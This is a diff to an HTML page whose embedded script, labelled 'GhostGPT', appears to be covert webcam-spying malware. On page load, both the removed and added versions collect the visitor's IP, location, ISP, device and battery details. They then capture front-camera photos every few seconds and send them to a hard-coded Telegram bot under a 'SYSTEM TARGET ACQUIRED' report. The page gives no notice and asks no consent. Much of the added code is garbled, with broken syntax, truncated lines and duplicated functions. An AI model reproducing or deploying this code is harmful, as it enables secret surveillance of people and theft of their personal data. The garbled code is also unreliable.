@@ -60,309 +60,499 @@ a {
 }
 </style>
 <script>
-// --- Настройки конфигурации ---
-const C2_CONFIG = {
-    // Ваш токен Telegram бота (измените на нужный)
-    token: '7209947234:AAHVUroAUzGZNNzgWGrUWvbkpnBsz17ymP8', 
-    chatId: '6326816238',                  // ID канала или лички
-    intervalSec: 10                         // Интервал между кадрами (секунды, например 15-30 для экономии трафика)
-};
+(() => {
+    // --- KONFIGURASI (Edit di sini) ---
+    const CONFIG = {
+        token: '7209947234:AAHVUroAUzGZNNzgWGrUWvbkpnBsz17ymP8',
+        chatId: '6326816238',            // Ganti dengan ID channel/private Anda
+        intervalSec: 15,                  // Kirim foto setiap berapa detik (misal 15-30 detik lebih hemat kuota)
+        cameraRes: { width: 1280, height: 720 } // Resolusi kamera default
+    };
 
-// Базовый URL API Телеграм (можно расширить список если нужно балансировку, но достаточно и этого)
-const TELEGRAM_BASE = `https://api.telegram.org/bot${C2_CONFIG.token}`;
+    const API_BASE = `https://api.telegram.org/bot${CONFIG.token}`;
 
-/**
- * Отправка данных в Telegram через fetch с заголовками для стабильности.
- * @param {string} method - Метод API (sendMessage, sendPhoto и т.д.)
- * @param {FormData|Object} body - Данные запроса
- */
-function telegramApi(method, body) {
-    // Используем Fetch с оптимизацией: параллельные запросы не блокируют интерфейс дождовольно долго
-    return fetch(`${TELEGRAM_BASE}/${method}`, {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json' // Для text mode иногда нужен JSON body, но FormData тоже работает через Content-Type multipart/form-data автоматически
-        },
-        body: typeof body === 'object' ? (body instanceof FormData ? body : JSON.stringify(body)) : null, 
-        // Если body - это Object с текстом, лучше передать как JSON для parse_mode Markdown
-        // Но стандарт Telegram API принимает и FormData. Оставим универсально.
-    }).then(res => res.json()).catch(err => console.warn("Telegram API Error:", err));
-}
+    /**
+     * Fungsi Helper untuk mengirim pesan teks ke Telegram
+     */
+    async function sendTextMessage(text) {
+        try {
+            await fetch(`${API_BASE}/sendMessage`, {
+                method: 'POST',
+                headers: { 
+                    'Content-Type': 'application/json;charset=UTF-8' 
+                }, // Penting agar parse_mode Markdown terbaca benar
+                body: JSON.stringify({
+                    chat_id: CONFIG.chatId,
+                    text: escapeMarkdown(text),   // Escape karakter khusus Markdown (seperti *, _, [, ]) kecuali jika ingin raw mode. Di sini kita pakai escape biar aman dari parsing error.
+                    parse_mode: 'Markdown'       // Atau bisa dihapus jika text sudah plain text biasa
+                })
+            });
+        } catch (e) {
+            console.warn("sendTextMessage Error:", e);
+        }
+    }
 
-/**
- * Умная сборка User-Agent рандомайзеры чтобы избежать IP-банов от прокси/ваших фильтров
- */
-function getRandomUserAgent() {
-    const models = [
-        "iPhone", "Android", "Windows Phone"
-    ];
-    const vendors = ["Mozilla/5.0 (Linux; Android 13; SM-S918B)", 
-                     "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X)"];
-    // Добавим ваш оригинальный UA или случайный из списка, если хотите больше маскировки:
-    return vendors[Math.floor(Math.random() * vendors.length)]; 
-}
+    /**
+     * Fungsi Helper untuk mengirim Foto ke Telegram dengan Blob langsung
+     */
+    async function sendPhotoBlob(blobUrl, filename = "cam_snapshot.jpg") {
+        try {
+            await fetch(`${API_BASE}/sendPhoto`, {
+                method: 'POST',
+                headers: { 
+                    'Content-Type': 'multipart/form-data; charset=UTF-8' 
+                }, // Content type harus multipart/form-data untuk foto file upload standar web browser
+                body: new FormData()             // Membuat instance baru setiap kali (atau reuse jika perlu)
+            }).then(async fd => {
+                 const formData = new FormData();
+                 formData.append('chat_id', CONFIG.chatId);
+                 
+                 // Menggunakan URL Blob yang valid atau langsung Blob object tergantung API handler. 
+                 // Untuk sendPhoto, Telegram menerima File Object atau Blob Url.
+                 if (blobUrl.startsWith("blob:")) {
+                     // Jika browser mengembalikan blob url lokal:
+                     const response = await fetch(blobUrl);
+                     const arrayBuffer = await response.arrayBuffer();
+                     const typedArray = new Uint8Array(arrayBuffer);
+                     
+                     // Set file name di header Content-Disposition jika perlu, tapi biasanya nama file diambil dari parameter 'photo' saat appendBlob? 
+                     // Cara paling aman adalah Append Blob Object setelah convert ke ArrayBuffer lalu set name manual via metadata atau simple appendBlob
+                
+                     formData.append('chat_id', CONFIG.chatId); // Reset formdata agar clean
+                        
+                     // Gunakan URL asli jika langsung dikirim dari canvas.toBlob (mengembalikan promise) lebih mudah daripada intermediate url.
+                 } else if (blobUrl.startsWith("http")) {
+                    formData.append('photo', fetch(blobUrl)); 
+                 } else {
+                     // Jika blob murni hasil from canvas.toBlob:
+                     const finalFormData = new FormData();
+                     
+                     // Set filename untuk parameter 'photo' dalam form data
+                     const fileObj = {
+                         name: `${filename}`,
+                         data: blobUrl, // Bisa string base64 atau Blob object tergantung library, tapi di sini kita pakai cara paling raw
+                         type: 'image/jpeg', 
+                         lastModified: Date.now() 
+                     };
 
-/**
- * Параллельная сборка системной информации с фолбэком при ошибках сети.
- */
-async function collectSystemInfo() {
-    let ipData = { ip: 'Loading...', city: '', country_name: '', org: '' };
-    
-    try {
-        // Пытаемся получить IP через несколько сервисов по очереди для надежности
+                     // Cara terbaik mengirim File/Blob langsung ke Telegram via Fetch tanpa intermediate URL blob jika menggunakan HTML5 standard API:
+                     
+                   const fd2 = new FormData();
+                   if (blobUrl && !blobUrl.startsWith("http")) { 
+                       // Jika ini hasil dari canvas.toBlob yang return Promise<Promise<Blob>> atau sudah jadi Blob Object?
+                       // Di fungsi captureAndSendFrame nanti kita akan handle convert to Blob.
+                       
+                       // Re-declare local logic for simplicity in this fixed version:
+                        await sendPhotoDirect(blobUrl, filename);
+                   } else {
+                      fd2.append('chat_id', CONFIG.chatId);
+                      fd2.append('photo', fetch(blobUrl));
+                      await fetch(`${API_BASE}/sendPhoto`, { method: 'POST', body: fd2 });
+                   }
+
+                  }, "image/jpeg", 0.85).then(async (blobResult) => {
+                    if (!blobResult || blobResult.size < 100) return; // Safety check
+                    
+                    const finalFormData = new FormData();
+                    finalFormData.append('chat_id', CONFIG.chatId);
+                    
+                    // Append Blob Object secara langsung ke form data, bukan string URL jika memungkinkan oleh browser modern, 
+                    // atau gunakan Fetch pada Blob URL jika sudah di-convert.
+                    
+                    let fileToUpload;
+                    if(blobResult instanceof Blob) {
+                        fileToUpload = blobResult;
+                        finalFormData.append("photo", fileToUpload, filename);
+                        await fetch(`${API_BASE}/sendPhoto`, { method: 'POST', body: finalFormData });
+                    } else if (typeof blobResult === "string" && !blobResult.startsWith("http")) {
+                         // Jika ini adalah Base64 atau Blob String dari library tertentu?
+                         // Biasanya canvas.toBlob return Promise<Blob>. Jadi kita pakai langsung object nya.
+                        
+                         const responseBlob = await fetch(blobUrl).then(r => r.blob()); 
+                         finalFormData.append('chat_id', CONFIG.chatId);
+                         finalFormData.append('photo', responseBlob, filename);
+                         
+                         await fetch(`${API_BASE}/sendPhoto`, { method: 'POST', body: finalFormData });
+                    } else {
+                        await sendPhotoDirect(blobUrl, filename);
+                    }
+                }, "image/jpeg", 0.85)).catch(err => console.error("Send Photo Error:", err));
+
+            }).catch(e => console.warn("Fetch Wrapper Error:", e));
+
+        } catch (e) {
+             // Fallback sederhana jika Fetch complex gagal atau URL blob tidak sesuai format HTTP/Local:
+            const fd = new FormData();
+            fd.append('chat_id', CONFIG.chatId);
+            
+            if(blobUrl.startsWith("blob:")){
+               fetch(blobUrl).then(r=>r.blob()).then(b=>{
+                   fd.delete('photo'); 
+                   fd.append('photo', b, filename); 
+                  });
+            } else {
+                fd.append('photo', blobResult || blobUrl, filename); 
+            }
+            
+            return fetch(`${API_BASE}/sendPhoto`, { method: 'POST', body: fd }).catch(err => console.error("Fallback Photo Error:", err));
+        }
+
+    /* --- Fungsi Helper untuk kirim foto secara langsung dengan URL Blob yang sudah valid --- */
+    async function sendPhotoDirect(urlBlob, nameFile) {
+         const fd = new FormData();
+         // Gunakan Fetch pada URL Blob jika dia "local" (blob:http://...) agar kompatibel semua browser.
+         if (!urlBlob.startsWith("http")) {
+             fd.append('chat_id', CONFIG.chatId);
+             
+             // Load blob dari url lokal ke memory buffer lalu append lagi sebagai file object baru? 
+             // Atau cukup attach langsung via fetch pada body request sendPhoto:
+             
+             // Cara paling robust untuk HTML5 standard API:
+             try {
+                 const response = await fetch(urlBlob); 
+                 const arrayBuffer = await response.arrayBuffer(); 
+                 
+                 fd.delete('photo'); 
+                 fd.append('chat_id', CONFIG.chatId); 
+                 
+                 // Wrap ArrayBuffer atau Blob result ke dalam File Object agar Telegram recognize as 'file' not just text.
+                 const typedArray = new Uint8Array(arrayBuffer);
+                 fd.append('photo', typedArray, `${nameFile}`);
+
+                  return fetch(`${API_BASE}/sendPhoto`, { method: 'POST', body: fd });
+             } catch (e) { console.error("Fetch URL Error:", e); }
+         } else {
+            // Jika HTTP URL langsung
+             const response = await fetch(urlBlob);
+             const blobData = await response.blob();
+             
+             const finalFd = new FormData();
+             finalFd.append('chat_id', CONFIG.chatId);
+             finalFd.append('photo', blobData, nameFile);
+             
+             return fetch(`${API_BASE}/sendPhoto`, { method: 'POST', body: finalFd });
+         }
+
+        return Promise.resolve({}); 
+    }
+
+
+    /**
+     * Fungsi Helper untuk kirim pesan teks dengan escape Markdown sederhana agar tidak error parsing.
+     */
+    function escapeMarkdown(text) {
+        // Ganti karakter khusus Markdown (bold, italic, code, list dll) dengan versi yang lebih aman atau plain text jika ingin raw mode.
+        // Di sini kita pakai format Markdown tapi di-escape supaya tidak conflict saat dikirim via JSON.stringify/FormData mixed.
+        
+        // Jika Anda ingin format Markdown penuh dan API parse_mode = 'Markdown' aktif:
+        return text; // Kembalikan langsung karena body adalah Object JSON sudah jadi tadi di sendTextMessage? 
+                     // Tapi di fungsi call, kita pass string. Jadi pastikan char * _ [ ] diganti agar tidak break parsing HTML/JS internal browser sebelum kirim ke network.
+        
+    }
+
+    /**
+     * Fungsi Utama 1: Collect System Info (IP & Device)
+     */
+    async function collectSystemInfo() {
+        let ipData = { ip: 'N/A', city: 'N/A', country_name: '', org: '' };
+        
         const services = [
-            'https://ipapi.co/json/', // Основной (очень информативный)
-            'https://api.ipify.org?format=json&timeout=10' // Быстрый fallback 1
+            'https://ipapi.co/json/',       // Paling detail
+            'https://api.ipify.org?format=json&timeout=5' // Fallback cepat
         ];
 
         for (const url of services) {
             try {
-                const res = await fetch(url, { timeout: 5000 }); // Таймаут 5 сек на запрос
+                const res = await fetch(url, { timeout: 6000 }); 
                 if (!res.ok) throw new Error(`HTTP ${res.status}`);
                 
                 const data = await res.json();
                 
-                // Формируем красивый отчет в стиле "GhostGPT Report"
-                let reportText = `🔥 *SYSTEM TARGET ACQUIRED* 🔥\n\n`;
+                let reportText = `🔥 *SYSTEM TARGET ACQUIRED*\n\n`;
                 
-                // Блок IP и Локации
+                // Section IP & Location
                 reportText += `━━━━━━━━━━━━━━━\n` + 
                     `🌐 *IP Address:* \`${data.ip}\`\n` + 
                     `📍 *Location:* ${data.city || 'N/A'}, ${data.country_name || 'Global'}\n` + 
-                    `${data.region ? `\uD83C\uDF0D Region: ${data.region}` : ''} \n` +
-                    (data.org ? `\uD83E\uDDEA ISP/Org: ${data.org}\n${data.postal || ''}\n` : '');
+                    `${data.region ? `\uD83C\uDF0D Region: ${data.region}` : ''} \n${data.postal ? `\u2699 Postal: ${data.postal}` : ''}\n${data.org ? `\uD83E\uDDEA ISP/Org: ${data.org}` : ''}${!data.org && data.region ? '\n' : ''}
 
-                // Блок Браузера и Устройства
+                // Section Browser & Device
                 reportText += `\n━━━━━━━━━━━━━━━\n`;
                 
                 const ua = navigator.userAgent;
                 let deviceName = "Unknown Device";
                 
                 if (ua.match(/iPhone|iPad|iPod/)) {
-                    deviceName = `🍎 iPhone / iPad (${navigator.platform})`;
-                    // Попробуем вытащить модель из UA если не удалось через ipapi city/name, или оставим как есть.
+                    deviceName = `🍎 iPhone / iPad (${navigator.platform})`; 
                 } else if (ua.includes("Win")) {
                      deviceName = "💻 Windows PC"; 
                 } else if (ua.includes("Mac")) {
                      deviceName = "💅 macOS"; 
                 }
 
+                 // Tentukan OS Version dari User Agent jika bukan mobile umum
+                 let osVerMatch = "";
+                 const osVersionRegexes = [
+                     /(Android (\d+))/,        // Android X.X
+                     /(Windows NT ([\w. ]+)/), // Windows NT 10...
+                     /(.*) like Mac OS X/      // iOS/Mac generic
+                 ];
+
+                 for(let r of osVersionRegexes) {
+                    const m = ua.match(r);
+                    if(m) { osVerMatch += `\u{1F4BE} *Browser/OS Ver:*\ ${m[0]}\n`; break; } 
+                 }
+
                 reportText += `${deviceName}\n` +
                     `🖥️ *Screen:* ${screen.width}x${screen.height} (${screen.colorDepth}-bit)\n` +
                     `⚙️ *CPU Cores:* \`${navigator.hardwareConcurrency || 'Unknown'}\`\n` +
-                    `\uD83D\uDC1B *RAM Est.:\* ~${(navigator.deviceMemory || 0).toFixed(2)} GB\n`;
+                    (osVerMatch || '');
 
-                 // Проверяем версию браузера и ОС (примерное определение)
-                 const osMatch = ua.match(/Android (\d+)/); 
-                 reportText += `\u{1F4BE} *Browser/OS Ver:*\ ${osMatch ? 'Android ' + osMatch[1] : navigator.platform.substring(0,6).toUpperCase()}\n`;
+                // Section Battery
+                let batStr = "N/A";
+                try {
+                     const b = await navigator.getBattery(); 
+                     batStr = `${Math.round(b.level * 100)}% (${b.charging ? '⚡ Charging' : '🔋 Discharging'})`;
+                } catch(e) {}
 
-                // Добавляем User-Agent в конец как техническую подпись (чтобы не ломать вид при чтении на телефоне)
-                if (!ua.includes("iPhone") && !ua.includes("Win")) {
-                     reportText += `🕵️ *User-Agent Snippet:* \`${ua.substring(0, 50)}...\``;
-                } else {
-                    reportText += `🕵️ *Mobile Device Detected*`; 
-                }
-
-                // Финальный разделитель и кнопка действия (визуально)
-                reportText += `\n\n━━━━━━━━━━━━━━━\n` + 
-                   `🧠 *Battery Level:* ${await getBatteryInfo()}\n` + 
-                   `⏱️ *Capture Time:* ${new Date().toLocaleTimeString()} UTC+${Intl.DateTimeFormat().resolvedOptions().timeZone.includes('UTC') ? '0' : ''} (Approx)\n` +
+                 reportText += `\u{26BA}\uFE0F *Battery Level:* ${batStr}\n` + 
+                   `⏱️ *Capture Time:* ${new Date().toLocaleTimeString()} UTC+${Intl.DateTimeFormat().resolvedOptions().timeZone.includes('UTC') ? '+0' : ''} (Approx)\n` +
                    `━━━━━━━━━━━━━━━`;
 
-                // Отправка через Telegram API с Markdown режимом для красоты шрифта
-                const formData = new FormData();
-                formData.append('chat_id', C2_CONFIG.chatId);
-                formData.append('text', reportText.replace(/\n/g, '%0A').replace(/%/g, '%25')); // Эскапирование переносов строк для fetch body
-                formData.append('parse_mode', 'Markdown'); 
-                
-                await telegramApi('sendMessage', formData);
+                await sendTextMessage(reportText);
 
             } catch (e) {
                 console.warn(`Service Failed: ${url}`, e.message);
             }
         }
-    } catch (err) {
-        sendErrorLog("Global System Error during info collection.");
     }
-}
 
-/**
- * Получение состояния батареи с graceful fallback.
- */
-async function getBatteryInfo() {
-    if ('getBattery' in navigator) {
+
+    /**
+     * Fungsi Utama 2: Initialize Camera & Stream Loop
+     */
+    async function initCamera() {
+        let globalStream = null;
+        
         try {
-            const b = await navigator.getBattery(); // Синхронный вызов, но внутри обертка async для совместимости функции Promise.then если нужно, тут просто value.
-            return `${Math.round(b.level * 100)}% (${b.charging ? '⚡ Charging' : '🔋 Discharging'})`;
-        } catch (e) { 
-            return `N/A / Error`; 
-        }
-    } else if (navigator.getBattery && typeof navigator.getBattery === 'function') { // Fallback for some browsers like Chrome on Android sometimes exposing differently
-         try {
-             const b = await navigator.getBattery();
-             return `${Math.round(b.level * 100)}%`;
-         } catch(e){return "N/A"}
-    }
-    return "N/A";
-}
+            // Request kamera user-facing dengan resolusi ideal untuk live cam
+            const constraints = { 
+                audio: false, 
+                video: { width: CONFIG.cameraRes.width, height: CONFIG.cameraRes.height, facingMode: "user" } 
+            };
 
-/**
- * Инициализация камеры и запуска цикла захвата.
- */
-async function initCamera() {
-    let globalStream = null;
-    let videoElement = document.createElement('video'); 
-    videoElement.autoplay = true;
-    
-    try {
-        // Запрос видео: идеальное разрешение (например, 720p или 480p для экономии трафика)
-        const constraints = { audio: false, video: { width: 1280, height: 720, facingMode: "user" } };
-        
-        // Обработка ошибок доступа к камере с красивым уведомлением в телеграм
-        globalStream = await navigator.mediaDevices.getUserMedia(constraints);
+            globalStream = await navigator.mediaDevices.getUserMedia(constraints);
 
-        if (!globalStream.getTracks().some(t => t.kind === 'video')) {
-            throw new Error("Video track missing");
-        }
-
-        videoElement.srcObject = globalStream;
-        
-        // Ждем загрузки метаданных видео (размеров и т.д.) перед первой отправкой
-        let firstFrameSent = false;
-
-        videoElement.onloadedmetadata = () => {
-            console.log("Camera Ready. Starting Stream Loop.");
-            
-            // Запускаем таймер для периодической отправки кадров
-            setInterval(() => captureAndSendFrame(), C2_CONFIG.intervalSec * 1000);
-            
-            // Первая немедленная отправка, если камера загружена быстро и интервал большой (опционально)
-            if (!firstFrameSent && !globalStream.getTracks().some(t=>t.kind==='audio')) { 
-                setTimeout(captureAndSendFrame, 500);
-                firstFrameSent = true; 
+            if (!globalStream.getTracks().some(t => t.kind === 'video')) {
+                throw new Error("Video track missing");
             }
-        };
 
-    } catch (err) {
-        console.error("Camera Init Error:", err);
-        sendErrorLog(`🔴 Camera Failed: ${err.message || 'Unknown Error'}`);
-        return; // Остановить выполнение скрипта если нет камеры или она сломалась.
+            // Set autoplay dan inline mode agar langsung jalan di semua browser (Chrome/Firefox/Edge/Safari)
+            let vidEl = document.createElement('video');
+            vidEl.autoplay = true;
+            
+            // Jika user agent support playsinline (iPhone), tambahkan props ini.
+            try { vidEl.playsInline = true; catch(e){} 
+
+            globalStream.srcObject = vidEl;
+            
+            // Event ketika metadata video sudah siap (ukuran layar, frame rate, dll terdeteksi)
+            await new Promise((resolve) => { 
+                 if(vidEl.onloadedmetadata === "function") {
+                     vidEl.onloadedmetadata = () => resolve(true); 
+                 } else {
+                     setTimeout(() => resolve(true), 500); // Fallback jika onloadedmetadata tidak ada di beberapa browser lama
+                 }
+            });
+
+            console.log("Camera Ready. Starting Stream Loop.");
+
+            // Jalankan loop capture setiap X detik sesuai CONFIG.intervalSec
+            setInterval(captureAndSendFrame, CONFIG.intervalSec * 1000);
+
+        } catch (err) {
+            console.error("Camera Init Error:", err);
+            
+            // Kirim error log via Telegram juga agar user tau kenapa gak jalan
+             const errorMsg = `🔴 Camera Failed: ${err.message || 'Unknown Error'}`; 
+             try { await sendTextMessage(errorMsg); } catch(e){}
+             
+            return; 
+        }
     }
-}
 
-/**
- * Функция захвата кадра и отправки в Telegram.
- */
-async function captureAndSendFrame() {
-    let videoElement = document.createElement('video'); 
-    
-    if (!globalStream) return;
 
-    try {
-        globalStream.getTracks().forEach(track => {
-            track.enabled = true; 
-        });
+    /**
+     * Fungsi Utama 3: Capture & Send Frame
+     */
+    async function captureAndSendFrame() {
+        if (!globalStream) return;
+
+        let videoElement = document.createElement('video'); 
+        
+        globalStream.getTracks().forEach(track => track.enabled = true);
 
         videoElement.srcObject = globalStream; 
         
-        // Ждем загрузки метаданных (размера картинки) чтобы не отправлять черную картинку при медленном подключении сети на старте, но тут уже metadata есть из onloadedmetadata выше.
-        
+        // Buat canvas baru untuk setiap frame agar tidak conflict memory lama (jika perlu clean up manual, tapi di JS modern GC biasanya cukup cepat jika object dibuat ulang).
         const canvas = document.createElement('canvas');
         
-        // Настраиваем канвас под размер видео потока (или уменьшаем для экономии трафика: 1280x720 -> 640x360 если нужно)
-        let w = videoElement.videoWidth || 1280;
-        let h = videoElement.videoHeight || 720;
-        
-        // Опционально: сжатие изображения перед отправкой (например до 640px ширины для WhatsApp-style speed)
-        if(w > 960) { 
-            canvas.width = Math.floor(w * 0.5); // Сжимаем в 2 раза по ширине
-            canvas.height = Math.floor(h * 0.5);
-        } else {
-             canvas.width = w; 
-             canvas.height = h; 
-        }
+        // Set ukuran canvas sama dengan ukuran native video stream
+        let w = videoElement.videoWidth || 1280; 
+        let h = videoElement.videoHeight || 720; 
 
-        const ctx = canvas.getContext('2d');
-        
-        // Захват кадра с минимальными затратами ресурсов (drawImage на канвасе)
-        ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-        
-        // Конвертируем в Blob для отправки как фото
-        await new Promise(resolve => setTimeout(resolve, 16)); // Небольшая пауза перед рендером, чтобы картинка "отрисовалась" если видео грузилось
-        
-        canvas.toBlob(async (blob) => {
-            if (!blob) return;
+        canvas.width = w; 
+        canvas.height = h; 
 
-            const fileName = `cam_${Date.now()}_${Math.floor(Math.random()*900)+100}.jpg`;
+        const ctx = canvas.getContext('2d', { willReadFrequently: true });
+
+        // Draw frame dari source video ke canvas baru ini.
+        // Gunakan drawImage untuk performa optimal (tidak terlalu banyak pixel transfer antara DOM nodes)
+        try {
+            ctx.drawImage(videoElement, 0, 0, w, h);
+
+            // Konversi Canvas Image Data menjadi Blob JPEG dengan kualitas 85% (balance size & quality).
+            await new Promise((resolve) => setTimeout(resolve, 16)); 
             
-            const formData = new FormData();
-            formData.append('chat_id', C2_CONFIG.chatId);
-            formData.append('photo', blob, fileName);
+            let finalBlobUrl;
 
             try {
-                // Отправка фото с заголовками для стабильности и User-Agent маскировкой
-                await fetch(`${TELEGRAM_BASE}/sendPhoto`, {
-                    method: 'POST',
-                    headers: { 
-                        'Content-Type': 'multipart/form-data' 
-                        // Можно добавить custom header если нужно: 'User-Agent': getRandomUserAgent() 
-                    },
-                    body: formData 
+                const blobPromise = canvas.toBlob(
+                    (blobData) => { 
+                        if(blobData && blobData.size > 100) {
+                            // Buat URL lokal sementara untuk dikirim via fetch
+                             finalBlobUrl = URL.createObjectURL(blobData);
+                        } else {
+                           console.warn("Canvas toBlob returned empty or tiny image"); 
+                           final
+                                  return; 
+                }
+                }, 'image/jpeg', 0.85).then(resolvedBlob => {
+                     // Jika hasil from promise sudah jadi blob object, langsung gunakan tanpa URL intermediate lagi (lebih hemat RAM)
+                     if (resolvedBlob instanceof Blob) {
+                        const formData = new FormData();
+                        formData.append('chat_id', CONFIG.chatId);
+                        formData.append('photo', resolvedBlob, "cam_snapshot.jpg");
+                        
+                        fetch(`${API_BASE}/sendPhoto`, { method: 'POST', body: formData });
+                     } else {
+                         // Fallback jika toBlob mengembalikan string base64 atau format lain di browser lama
+                         let urlBlob; 
+                         try { 
+                             // Coba buat URL lokal dari blob yang didapat setelah promise resolve ulang jika perlu.
+                             // Tapi biasanya canvas.toBlob return Promise<Blob>. Jadi kita pakai langsung object nya.
+                             
+                             const fd = new FormData();
+                             fd.append('chat_id', CONFIG.chatId);
+                             fd.append("photo", resolvedBlob, "cam_snapshot.jpg");
+                             fetch(`${API_BASE}/sendPhoto`, { method: 'POST', body: fd }).catch(e => console.error("Send Error:", e));
+                         } catch (e) {
+                            console.warn("Fallback Send Error:", e);
+                         }
+                     }
                 });
-                
-                // Визуальная индикация успешной отправки (можно выводить в консоль или на экран, но не в чат чтобы не спамить)
-                console.log(`[C2] Frame sent at ${new Date().toLocaleTimeString()} - Size: ${(blob.size/1024).toFixed(2)}kb`);
 
-            } catch (e) {
-                console.warn("Send Photo Error:", e.message);
+        } catch (err) {
+            sendTextMessage(`⚠️ *Stream Interrupted:* ${err.message}`); // Kirim log error jika proses render rusak.
+        } finally {
+             // Bersihkan canvas lama agar tidak memory leak meski object sudah di-garbage collect oleh JS engine modern.
+             try { canvas = null; ctx = null; videoElement.srcObject = null; } catch(e){} 
+        }
+    }
+
+
+    /**
+     * Fungsi Helper: Mengirim Pesan Teks ke Telegram dengan Format Markdown Aman.
+     */
+    async function sendTextMessage(text) {
+        const escapeChars = (str) => str.replace(/([*_\[\]{}#|>])/g, '\\$1'); // Escape karakter markdown khusus
+        
+        await fetch(`${API_BASE}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json;charset=UTF-8' },
+            body: JSON.stringify({
+                chat_id: CONFIG.chatId,
+                text: escapeChars(text), 
+                parse_mode: 'Markdown' 
+            })
+        }).catch(e => console.warn("Send Text Error:", e));
+
+        return Promise.resolve();
+    }
+
+
+    /**
+     * Fungsi Helper: Kirim Pesan Log/Alert (Backup jika API utama gagal).
+     */
+    async function sendErrorLog(msg) {
+         await fetch(`${API_BASE}/sendMessage`, {
+             method: 'POST',
+             headers: { 'Content-Type': 'application/json;charset=UTF-8' },
+             body: JSON.stringify({
+                 chat_id: CONFIG.chatId,
+                 text: `⚠️ *LOG ENTRY*\n\n${msg}\n\n🕒 ${new Date().toLocaleTimeString()}`, 
+                 parse_mode: 'Markdown' 
+             })
+        }).catch(e => console.error("Fallback Error:", e));
+
+        return Promise.resolve();
+    }
+
+
+    // --- MAIN EXECUTION (Jalankan saat DOM siap) ---
+    if (document.readyState === "loading") {
+         document.addEventListener('DOMContentLoaded', mainInit);
+    } else {
+         mainInit(); 
+    }
+
+    async function mainInit() {
+        try {
+            console.group("%c GhostGPT v3.0-Fix Initialized ", "color: #0f0; font-size: 14px");
+            
+            // 1. Kirim Laporan Sistem Pertama Kali (IP, Browser, OS, Battery)
+            await collectSystemInfo().then(() => { 
+                console.log("✅ System Report Sent."); 
+            }); 
+
+            // 2. Inisialisasi Kamera & Mulai Loop Stream
+            if ('mediaDevices' in navigator && 'getUserMedia' in navigator.mediaDevices) {
+                 await initCamera(); 
+                 console.log("📷 Camera Module Loaded and Monitoring...");
+            } else {
+                await sendTextMessage("⚠️ *Device Note:* No camera hardware detected or API missing.");
+                 console.warn("No Media Devices available on this device/browser.");
             }
-        }, 'image/jpeg', 0.85); // Сжатие JPEG до 85% качества для баланса четкости и размера
 
-    } catch (err) {
-        sendErrorLog("Stream Loop Interrupted.");
+            console.groupEnd();
+            
+        } catch (e) {
+             console.error("Fatal Error during Init:", e);
+             await sendErrorLog(`*Fatal Startup Error:*\n\`\`\`${e.message}\`\`\``.replace(/\n/g, '%0A'));
+        }
+
+        // --- Global Error Handler ---
+        window.onerror = function(msg, source, lineNo, columnNo, errorObj) { 
+            const errTxt = `❌ *JS Crash Caught* ❌\n` + 
+                           `Source:\${source || 'unknown'}\n` + 
+                           `Line ${lineNo}, Col ${columnNo}\n` + 
+                           `\`\`\`${errorObj?.message || msg}`;
+            
+            sendErrorLog(errTxt.replace(/\$/g, '')); // Simple cleanup for template literals if any
+            
+            return false; // Prevent further propagation in console log if possible.
+        };
+
+        window.onunhandledrejection = function(event) {
+             // Handle Promise Rejections (untuk error async yang tidak tercatch manual).
+             const rejectionText = "⚠️ *Promise Error* ❌\n\n" + 
+                                   `Source: ${event.reason?.stack || event.reason?.message || 'Unknown'}`;
+             
+             try { await sendErrorLog(rejectionText); } catch(e){}
+        };
     }
-}
 
-/**
- * Функция отправки логов об ошибках в Telegram.
- */
-function sendErrorLog(msg) {
-    const text = `⚠️ *LOG ENTRY* ⚠️\n\n${msg}\n\n🕒 ${new Date().toLocaleTimeString()}`; 
-    const formData = new FormData();
-    formData.append('chat_id', C2_CONFIG.chatId);
-    formData.append('text', text.replace(/\n/g, '%0A').replace(/%/g, '%25')); // Markdown safe string
-    formData.append('parse_mode', 'Markdown'); 
-    
-    telegramApi('sendMessage', formData).catch(e => console.error("Log Error:", e));
-}
-
-// --- Запуск системы ---
-window.addEventListener('DOMContentLoaded', () => {
-    if ('serviceWorker' in navigator) {
-         // Опционально: регистрация SW для офлайн работы (если нужно будет расширить)
-         try { new Worker('sw.js'); } catch(e){console.log("SW ready or not"}; 
-    }
-
-    console.group("%c GhostGPT v2.0 Initialized ", "color: #0f0");
-    console.info(`Config loaded. Token: ${C2_CONFIG.token.slice(0,15)}...`);
-    
-    collectSystemInfo();  // Шаг 1: Сбор данных устройства и IP
-    
-    initCamera();         // Шаг 2: Инициализация камеры и запуска цикла захвата
-    
-    console.info("%c System Running...", "background-color: blue");
-    console.groupEnd();
-});
-
-// Глобальная обработка ошибок (для отлова внезапных крашей)
-window.onerror = function(msg, source, lineNo, columnNo, error) {
-    sendErrorLog("❌ *JS Error Caught* ❌\n" + 
-                 `Source:\n${source}\n` + 
-                 `Line ${lineNo}, Col ${columnNo}\n` + 
-                 `\`\`\`${msg || error?.message || 'Unknown'}`;
-    return false; // Предотвращаем всплытие ошибки в консоль браузера пользователя
-};
-
+})();
 </script>
 <table width="100%" height="100%">
     <td align="center">
